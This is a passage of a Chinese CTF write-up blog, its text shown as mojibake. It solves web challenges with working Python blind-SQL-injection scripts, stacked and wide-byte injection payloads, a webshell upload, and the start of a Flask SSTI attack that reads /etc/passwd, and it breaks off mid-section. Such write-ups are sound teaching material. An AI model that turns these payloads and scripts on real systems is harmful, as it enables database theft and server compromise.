    <content type="html"><![CDATA[<p>æœ€è¿‘çš„å‡ ä¸ªå…¬ç›Šèµ›ç¡®å®åŠçš„ä¸é”™ï¼Œå®‰å…¨äººå‘˜ä¹Ÿéƒ½æ˜¯å¾ˆçƒ­çˆ±ç¥–å›½çš„â™¥ï¼Œä¸­å›½åŠ æ²¹ğŸ˜  æ­¦æ±‰åŠ æ²¹ğŸ˜  å¤§å®¶åŠ æ²¹ğŸ˜ <a id="more"></a></p><h2 id="Web-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"><a href="#Web-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ" class="headerlink" title="Web-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"></a>Web-ç®€å•çš„æ‹›è˜ç³»ç»Ÿ</h2><p>è€ƒå¯ŸSQLæ³¨å…¥</p><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æµ‹è¯•å‘ç°ç™»å½•çš„<code>username</code>å¤„å­˜åœ¨æ³¨å…¥ï¼Œä¸‡èƒ½å¯†ç å°±èƒ½ç™»å½•<br><img src="http://www.ggb0n.cool/images/ichunqiu0.png" alt=""><br>è¿™ä¸ªåœ°æ–¹å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå¯ä»¥åˆ©ç”¨ç›²æ³¨çˆ†åº“ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ€è·¯å°±æ˜¯é€šè¿‡åˆ¤æ–­ç”¨æˆ·åçš„æ¡ä»¶ä¸º<code>true</code>ç™»å½•è¿›è¡Œæ³¨å…¥ï¼Œå½“ç„¶è¿˜éœ€è¦ä¸€ä¸ªç°æœ‰çš„ç”¨æˆ·æ¥ç™»å½•ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ³¨å†Œä¸ªç”¨æˆ·å°±è¡Œäº†ï¼Œå‚è€ƒå¦‚ä¸‹çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://4b5b40858ffa4258bd74ee72c106522abdc060eb08674169.changame.ichunqiu.com/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select database()),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select table_name from information_schema.tables where table_schema='nzhaopin' limit 1 offset 3),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select column_name from information_schema.columns where table_name='flag' limit 1 offset 1),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line">payload = <span class="string">"2' and (select (mid((select flaaag from flag limit 1 offset 0),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># backup flag  user           flag: id  flaaag</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789_-&#123;&#125;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"lname"</span>: payload.format(i, database + n),</span><br><span class="line">            <span class="string">"lpass"</span>: <span class="string">"xxx"</span></span><br><span class="line">        &#125;</span><br><span class="line">        req = requests.post(url, data=data)</span><br><span class="line">        req.encoding = <span class="string">'gbk'</span></span><br><span class="line">        <span class="comment"># print(req.encoding)</span></span><br><span class="line">        print(data[<span class="string">"lname"</span>])</span><br><span class="line">        <span class="comment"># print(req.text.encode('gbk').decode(req.apparent_encoding))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"æˆåŠŸ"</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text.encode(<span class="string">'gbk'</span>).decode(req.apparent_encoding):</span><br><span class="line">            print(<span class="string">"*                      "</span> + n)</span><br><span class="line">            database += n</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Web-ezupload"><a href="#Web-ezupload" class="headerlink" title="Web-ezupload"></a>Web-ezupload</h2><p>æ–‡ä»¶ä¸Šä¼ é¢˜</p><h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æœ¬ä»¥ä¸ºæ˜¯ä¸€é“æ‹å¼¯çš„ä¸Šä¼ é¢˜ï¼Œç»“æœç›´æ¥ä¼ ä¸Šé©¬äº†â€¦<br>èšå‰‘è¿ä¸Šï¼Œ<code>flag</code>æ–‡ä»¶æ˜¯ç©ºçš„ï¼Œä½†æ˜¯ä¸‹é¢æœ‰ä¸ª<code>/readflag</code>æ–‡ä»¶ï¼Œå¼€ä¸­æ–­è¿è¡Œè¿™ä¸ªç¨‹åºå°±èƒ½æ‹¿åˆ°flagã€‚<br><img src="http://www.ggb0n.cool/images/ichunqiu2.png" alt=""><br><img src="http://www.ggb0n.cool/images/ichunqiu3.png" alt=""></p><h2 id="Web-ç›²æ³¨"><a href="#Web-ç›²æ³¨" class="headerlink" title="Web-ç›²æ³¨"></a>Web-ç›²æ³¨</h2><p>åˆ©ç”¨æ­£åˆ™è¿›è¡Œæ—¶é—´ç›²æ³¨</p><h3 id="è§£é¢˜-2"><a href="#è§£é¢˜-2" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>é¢˜ç›®å·²ç»è¯´çš„å¾ˆæ˜æ˜¾äº†ï¼Œéœ€è¦è¿›è¡Œç›²æ³¨ï¼Œä½†æ˜¯æœ‰wafï¼Œè¿‡æ»¤äº†å¾ˆå¤šå¸¸ç”¨çš„æ³¨å…¥è¯­å¥ï¼Œä½†æ˜¯<code>REGEXP</code>å¹¶æ²¡æœ‰è¢«banï¼Œé‚£ä¹ˆåˆ©ç”¨è¿™ä¸ªå‡½æ•°å¾ˆç®€å•åœ°å°±èƒ½æ‹¿åˆ°flagã€‚<br><code>REGEXP</code>ï¼šåœ¨åˆ—å€¼å†…è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœè¢«åŒ¹é…çš„æ–‡æœ¬åœ¨åˆ—å€¼ä¸­å‡ºç°ï¼Œ<code>REGEXP</code>å°†ä¼šæ‰¾åˆ°å®ƒï¼Œç›¸åº”çš„è¡Œå°†è¢«è¿”å›ï¼Œ<code>REGEXP</code>èƒ½åŒ¹é…æ•´ä¸ªåˆ—å€¼ã€‚å¹¶ä¸”<code>REGEXP</code>æ£€æŸ¥æ€»æ˜¯è¿”å›<code>0ï¼ˆæ²¡æœ‰åŒ¹é…ï¼‰</code>æˆ–<code>1ï¼ˆåŒ¹é…ï¼‰</code>ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://49682a5d648a44fe94ba09271ec5fbe569c33f63b1c6435b.changame.ichunqiu.com/?id='</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">            payload = <span class="string">'1 and if((fl4g    REGEXP "^&#123;0&#125;"),sleep(3),5);'</span></span><br><span class="line">            payload = payload.format(flag+n)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            req = requests.get(url+payload)</span><br><span class="line">            <span class="comment">#print(req.text)</span></span><br><span class="line">            <span class="keyword">if</span> (time.time() - start_time)&gt;<span class="number">2</span>:</span><br><span class="line">                print(flag)</span><br><span class="line">                flag += n</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Web-blacklist"><a href="#Web-blacklist" class="headerlink" title="Web-blacklist"></a>Web-blacklist</h2><p>æœ¬é¢˜æ˜¯[å¼ºç½‘æ¯]éšä¾¿æ³¨çš„æ”¹ç‰ˆï¼Œè€ƒå¯Ÿå †å æ³¨å…¥ï¼Œè¿™é¢˜getåˆ°æ³¨å…¥æ–°å§¿åŠ¿ï¼Œåˆ©ç”¨<code>mysql</code>æ•°æ®åº“ä¸­<code>HANDLER</code>ç»•è¿‡é»‘åå•æ‹¿flagã€‚</p><h3 id="è§£é¢˜-3"><a href="#è§£é¢˜-3" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®å‘ç°è·Ÿå¼ºç½‘æ¯ä¸€æ ·çš„è¾“å…¥æ¡†ï¼Œé¦–å…ˆå°±æƒ³åˆ°äº†å †å æ³¨å…¥ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu4.png" alt=""><br>å¯ä»¥çœ‹åˆ°ï¼Œè¯­æ³•æˆåŠŸæ‰§è¡Œäº†ã€‚<br>ä½†æ˜¯å†å»æµ‹è¯•å…¶ä»–å…³é”®å­—çš„æ—¶å€™å‘ç°å¾ˆå¤šå…³é”®å­—è¢«banäº†ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu5.png" alt=""><br>æœ¬æƒ³ç€åˆ©ç”¨å¼ºç½‘æ¯çš„æ–¹æ³•ï¼Œé€šè¿‡æ”¹è¡¨åæ¥æ‹¿flagçš„ï¼Œä½†æ˜¯<code>rename</code>ä¹Ÿè¢«banäº†ï¼Œç»“åˆ<code>select</code>åˆè¢«banï¼Œå¸¸è§„çš„å§¿åŠ¿æ€•æ˜¯ä¸è¡Œï¼Œåæ¥å€Ÿç”¨<code>handler</code>æ‰æ‹¿åˆ°flagï¼Œpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">handler</span> FlagHere <span class="keyword">open</span>;<span class="keyword">handler</span> FlagHere <span class="keyword">read</span> <span class="keyword">first</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/ichunqiu6.png" alt=""><br>å…³äº<code>handler</code>å¯ä»¥å‚è€ƒ<a href="https://www.jb51.net/article/88732.htm">è¿™é‡Œ</a>ã€‚</p><h2 id="Web-easysqli-copy"><a href="#Web-easysqli-copy" class="headerlink" title="Web-easysqli_copy"></a>Web-easysqli_copy</h2><p>è¿˜æ˜¯è€ƒå¯ŸPDOã€check()å‡½æ•°çš„ç»•è¿‡ã€å®é™…ç›²æ³¨ï¼Œä¸è¿‡è¿™é¢˜ä¹Ÿgetåˆ°äº†æ–°å§¿åŠ¿ï¼šåˆ©ç”¨<code>é¢„å¤„ç†è¯­å¥</code>è¿›è¡Œå †å æ³¨å…¥ï¼Œè¿™ä¹Ÿæ˜¯é‡‡ç”¨äº†PDOä¹‹åæ³¨å…¥çš„æ–°è¶‹åŠ¿äº†ã€‚<br>æ‰©å±•ä¸€ä¸‹çŸ¥è¯†ï¼š</p><blockquote><p>åœ¨phpä¸­ï¼Œ<code>PDO</code>æœ‰ä¸¤ç§æ¨¡å¼ï¼š<code>æ¨¡æ‹Ÿé¢„ç¼–è¯‘</code>ä¸<code>éæ¨¡æ‹Ÿé¢„ç¼–è¯‘</code>ã€‚é»˜è®¤ä¸ºæ¨¡æ‹Ÿé¢„ç¼–è¯‘æ¨¡å¼ï¼Œå³ä¸æ˜¯çœŸæ­£çš„é¢„ç¼–è¯‘ï¼Œè€Œæ˜¯é‡‡ç”¨<code>PDO::quote()</code>å‡½æ•°ï¼Œé¦–å…ˆå°†ç”¨æˆ·è¾“å…¥è½¬åŒ–ä¸ºå­—ç¬¦å‹ï¼Œä¹‹åå°†å¼•å·ç­‰æ•æ„Ÿå­—ç¬¦è½¬ä¹‰ã€‚è¿™æ ·åœ¨<code>gbk</code>ç¼–ç ä¸‹ï¼Œå³å¯é€šè¿‡å®½å­—èŠ‚æ³¨å…¥ç»•è¿‡é˜²æŠ¤ã€‚<br>ä½†æ˜¯ç»•è¿‡PDOä¹‹åï¼Œä¾ç„¶å¾ˆéš¾ç»•è¿‡<code>check()</code>å‡½æ•°ï¼Œäºæ˜¯æ­¤å¤„åˆ©ç”¨åˆ°äº†PDOçš„ç¬¬äºŒä¸ªé»˜è®¤ç‰¹æ€§ï¼šæ”¯æŒ<code>å¤šå¥æ‰§è¡Œ</code>ï¼Œå³å¯è¿›è¡Œå †å æ³¨å…¥ã€‚</p></blockquote><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ç»™å‡ºäº†æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span>,$str,$matches))</span><br><span class="line">        &#123;</span><br><span class="line">            print_r($matches);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=pdotest'</span>,<span class="string">'root'</span>,<span class="string">'******'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $test = $db-&gt;query(<span class="string">"select balabala from table1"</span>);</span><br><span class="line">        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">        $id = $res[<span class="string">'balabala'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(check($id))</span><br><span class="line">    &#123;</span><br><span class="line">        $query = <span class="string">"select balabala from table1 where 1=?"</span>;</span><br><span class="line">        $db-&gt;query(<span class="string">"set names gbk"</span>);</span><br><span class="line">        $row = $db-&gt;prepare($query);</span><br><span class="line">        $row-&gt;bindParam(<span class="number">1</span>,$id);</span><br><span class="line">        $row-&gt;execute();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æºç å‘ç°ï¼Œè¿™é‡Œåˆ©ç”¨äº†<a href="https://www.runoob.com/php/pdo-query.html">PDO</a>æ¥å£è¿›è¡Œä¸æ•°æ®åº“çš„é“¾æ¥ï¼Œå…¶ä¸­<code>prepare</code>å°±æ˜¯å‡†å¤‡äº†ä¸€ä¸ªé¢„å¤„ç†è¯­å¥ï¼Œ<code>$row-&gt;bindParam(1,$id);</code>ä¸­çš„<a href="https://www.runoob.com/php/pdostatement-bindparam.html">binParam</a>ä½œç”¨æ˜¯ç»‘å®šä¸€ä¸ªå‚æ•°åˆ°æŒ‡å®šçš„å˜é‡åã€‚<br>è¯·æ•™åˆ«çš„å¸ˆå‚…äº†è§£åˆ°PDOä¸­å•å¼•å·å¯èƒ½æ˜¯è¢«è‡ªåŠ¨è¿‡æ»¤çš„ï¼Œé‚£å°±åªå¥½åˆ©ç”¨å®½å­—èŠ‚ç»•è¿‡ï¼š<code>%df%27</code>ï¼Œæºç é‡Œåˆ©ç”¨äº†é¢„å¤„ç†è¯­å¥ï¼Œæ³¨å…¥çš„æ—¶å€™ä¹Ÿå°±é€‰æ‹©äº†åˆ©ç”¨é¢„å¤„ç†è¯­å¥è¿›è¡Œæ³¨å…¥ï¼ŒåŒæ—¶ç»“åˆ16è¿›åˆ¶ç¼–ç ç»•è¿‡å¯¹å…³é”®å­—çš„è¿‡æ»¤ã€‚</p><h3 id="è§£é¢˜-4"><a href="#è§£é¢˜-4" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://96e2f11ccc1147559b9e8c7c9991e494c4dd1d4ca36f4428.changame.ichunqiu.com/?id=1%df%27;'</span></span><br><span class="line">    payloads = <span class="string">"set @a=0x&#123;0&#125;;prepare ctftest from @a; execute ctftest;"</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-'</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        print(<span class="string">"å‰&#123;0&#125;ä½"</span>.format(m))</span><br><span class="line">        payload = <span class="string">"select if (ascii(mid((select fllllll4g from table1 ),&#123;0&#125;,1))=&#123;1&#125;, sleep(3), 1)"</span>  <span class="comment"># ç”±äºæˆ‘ä»¬ä¼šè½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œæ‰€ä»¥ä¸å­˜åœ¨ä»»ä½•è¿‡æ»¤ï¼Œå…³é”®è¯éšä¾¿ä½¿ç”¨</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">            <span class="comment"># print(payload.format(m, n))</span></span><br><span class="line">            xxx = url + payloads.format(str_to_hex(payload.format(m, ord(n))))</span><br><span class="line">            <span class="comment"># print(xxx)</span></span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(xxx)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">2</span>:</span><br><span class="line">                flag += n</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])  <span class="comment"># å­—ç¬¦ä¸²è½¬æ¢ä¸º16è¿›åˆ¶çš„å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="Web-Easqli"><a href="#Web-Easqli" class="headerlink" title="Web-Easqli"></a>Web-Easqli</h2><p>è€ƒå¯Ÿç›²æ³¨ï¼Œè¿™é¢˜ä¹Ÿå­¦åˆ°äº†æ–°å§¿åŠ¿ï¼šåœ¨<code>union select</code>è¢«bançš„æƒ…å†µä¸‹ï¼Œè¿›è¡Œ<code>å¤šåˆ—</code>æ•°æ®çš„çˆ†ç ´ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªå¤§å¤§çš„è¾“å…¥æ¡†ï¼Œå¤šæ¬¡å°è¯•å‘ç°è¾“å…¥<code>1</code>çš„æ—¶å€™å›æ˜¾<code>Hello Nu1L</code>ï¼Œè¾“å…¥<code>0</code>çš„æ—¶å€™å›æ˜¾<code>hello</code>ï¼Œåæ¥æµ‹è¯•äº†å¤šä¸ªå…³é”®å­—ï¼Œå‘ç°<code>union select</code>å•ç”¨çš„æ—¶å€™æ²¡é—®é¢˜ï¼Œè”åˆèµ·æ¥ä½¿ç”¨æ€ä¹ˆéƒ½ç»•ä¸è¿‡ï¼Œ<code>or</code>ã€<code>and</code>ä¹Ÿè¢«banäº†ï¼Œä½†æ˜¯<code>&amp;&amp;</code>æ²¡è¢«banï¼Œè¿™é‡Œæœ‰æå¤´ï¼Œç„¶åæµ‹äº†ä¸€ä¸‹ï¼Œè¯­å¥ä¸º<code>true</code>å›æ˜¾ä¹Ÿæ˜¯<code>hello Nu1L</code>ï¼Œå°±ä»è¿™é‡Œä¸‹æ‰‹äº†ã€‚<br>åæ¥åˆå‘ç°<code>information_schema</code>ä¹Ÿè¢«banäº†ï¼Œè¿™æ—¶å€™æƒ³åˆ°äº†ä¹‹å‰ä¸€ä¸ªé¢˜é‡Œè®²è¿‡çš„ï¼šåˆ©ç”¨mysqlç³»ç»Ÿåº“<code>sys.schema_table_statistics_with_buffer</code>æˆ–è€…<code>sys.schema_auto_increment_columns</code>è·å–åˆ°äº†è¡¨åï¼Œä½†æ˜¯å› ä¸º<code>union select</code>è¢«banï¼Œæ— åˆ—åæ³¨å…¥ä¹Ÿæ²¡æ³•è¿›è¡Œï¼Œè¿™æ—¶å€™å°±ç”¨åˆ°äº†å‰é¢è¯´çš„å­¦åˆ°çš„æ–°å§¿åŠ¿äº†ï¼šåˆ©ç”¨<code>id=2-(select (select 1,{0})&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))&quot;</code>è¿™æ ·çš„è¯­å¥ä½¿è¿›è¡Œä¸¤åˆ—çš„å¯¹æ¯”ï¼Œä»è€Œçˆ†ç ´å‡ºç¬¬äºŒåˆ—(flagåˆ—)çš„å†…å®¹ã€‚è„šæœ¬å¦‚ä¸‹ï¼š</p><h3 id="è§£é¢˜è„šæœ¬"><a href="#è§£é¢˜è„šæœ¬" class="headerlink" title="è§£é¢˜è„šæœ¬"></a>è§£é¢˜è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ab8f8551f4dc43a4bc43854950cb1088190a260570ee455c.changame.ichunqiu.com/index.php'</span></span><br><span class="line">headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select database()),1,&#123;0&#125;)='&#123;1&#125;'"</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select table_name from sys.schema_table_statistics_with_buffer where table_schema='ctf' limit 1 offset 1),1,&#123;0&#125;)='&#123;1&#125;'"</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select column_name from sys.schema_auto_increment_columns where table_name='f1ag_1s_h3r3_hhhhh' limit 1),1,&#123;0&#125;)='&#123;1&#125;'" #ä¸å¯ç”¨ï¼Œéœ€è¦è¿›è¡Œæ— åˆ—åæŸ¥è¯¢</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select * from f1ag_1s_h3r3_hhhhh limit 1),1,&#123;0&#125;)='&#123;1&#125;'" #ä¸å¯ç”¨ï¼Œå› ä¸ºæœ‰ä¸¤åˆ—</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'0123456789bcdehijkmnopqrstuvwxyz_-&#123;&#125;'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(1, 80):</span></span><br><span class="line"><span class="string">    for n in letter:</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            "id": payload.format(i, database + n),</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        req = requests.post(url, data=data,headers=headers)</span></span><br><span class="line"><span class="string">        # print(req.text.encode('gbk').decode(req.apparent_encoding))</span></span><br><span class="line"><span class="string">        if "Hello Nu1L" in req.text:</span></span><br><span class="line"><span class="string">            print(n)</span></span><br><span class="line"><span class="string">            flag += n</span></span><br><span class="line"><span class="string">            print(database)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">                a = chr(i).encode().hex()</span><br><span class="line">                payload = <span class="string">"id=2-(select (select 1,0x%s)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))"</span>%(flag.encode().hex()+a) <span class="comment">#åˆ›å»ºä¸¤åˆ—æ•°æ®å»æ¯”è¾ƒ</span></span><br><span class="line">                <span class="comment">#print("Test:"+chr(i))</span></span><br><span class="line">                html = requests.post(url=url,data=payload,headers=headers)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"Hello Nu1L"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">                        flag += chr(i<span class="number">-1</span>)</span><br><span class="line">                        print(<span class="string">"Find:"</span>+flag)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> chr(i) == <span class="string">'&#125;'</span>:</span><br><span class="line">                flag +=<span class="string">'&#125;'</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="Web-FlaskApp"><a href="#Web-FlaskApp" class="headerlink" title="Web-FlaskApp"></a>Web-FlaskApp</h2><p>è€ƒå¯ŸSSTI</p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®å‘ç°æ˜¯ä¸€ä¸ªbase64åŠ å¯†è§£å¯†ç½‘ç«™ï¼Œç›´æ¥è€ƒè™‘SSTIäº†ã€‚å¹¶ä¸”è¿™ä¸ªé¢˜è·Ÿå¦å¤–ä¸€ä¸ªåˆ©ç”¨Flaskå†™çš„åŠ å¯†çš„é¢˜å¾ˆåƒï¼Œä¾¿å‚è€ƒäº†é‚£ä¸ªé¢˜çš„<a href="https://www.anquanke.com/post/id/197602?display=mobile">è§£é¢˜æ€è·¯</a>ï¼šåœ¨å¼€å¯DEBUGæ¨¡å¼çš„æƒ…å†µä¸‹è¿›è¡Œæ¨¡æ¿æ³¨å…¥ã€‚<br>é¦–å…ˆæµ‹è¯•ä¸€ä¸‹SSTIæ˜¯å¦èƒ½ç”¨ï¼šå…ˆåœ¨åŠ å¯†é¡µé¢å¯¹<code></code>åŠ å¯†ä¸€ä¸‹ï¼Œç„¶ååˆ°è§£å¯†é¡µè§£å¯†ï¼Œé¡µé¢å›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu8.png" alt=""><br>ç”±æ­¤å¾—çŸ¥ï¼Œç¡®å®æ˜¯SSTIï¼ŒåŒæ—¶è¿˜çœ‹åˆ°äº†å¼€å¯äº†DEBUGæ¨¡å¼ã€‚<br>é‚£å°±åˆ©ç”¨é‚£é“é¢˜çš„è§£é¢˜æ€è·¯å»åšå§ã€‚</p><h3 id="è§£é¢˜-5"><a href="#è§£é¢˜-5" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>å‚è€ƒå‰é¢çš„é“¾æ¥æˆ‘ä»¬çŸ¥é“ï¼Œè¿™é“é¢˜å¯ä»¥é€šè¿‡è®¡ç®—å‡º<code>PIN</code>æ¥ç™»å½•æ§åˆ¶å°ï¼Œç„¶ååœ¨æ§åˆ¶å°è¿›è¡Œæ“ä½œæ‹¿flagã€‚ä½†æ˜¯ç”Ÿæˆ<code>PIN</code>çš„è„šæœ¬éœ€è¦çŸ¥é“<code>username</code>(è¿™ä¸ªéœ€è¦æˆ‘ä»¬è‡ªå·±å»æ‰¾)ã€<code>modname</code>(ä¸€èˆ¬æ˜¯<code>flask.app</code>)ã€ç¬¬ä¸‰ä¸ªå€¼<code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code>(ä¸€èˆ¬æ˜¯<code>Flask</code>)ã€ç¬¬å››ä¸ªå€¼<code>getattr(mod, &quot;__file__&quot;, None)</code>(åœ¨æŠ¥é”™é¡µé¢å¯ä»¥çœ‹åˆ°é¢˜ç›®çš„ç¯å¢ƒ)ã€ç¬¬äº”ä¸ªæ˜¯<code>str(uuid.getnode())</code>çš„å€¼ï¼Œæœ€åæ˜¯æœºå™¨ç ã€‚<br>æŠ¥é”™é¡µé¢å›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu9.png" alt=""></p><h4 id="è·å–username"><a href="#è·å–username" class="headerlink" title="è·å–username"></a>è·å–username</h4><p>å¯ä»¥åœ¨<code>/etc/passwd</code>ä¸­è¯»å–åˆ°ç”¨æˆ·åï¼Œè¿™é‡Œç”±äºé¢˜ç›®ç¯å¢ƒæ˜¯Python3çš„ï¼Œå› æ­¤è¯»æ–‡ä»¶éœ€è¦ç”¨å¦‚ä¸‹payloadï¼š</p><figure class="highlight 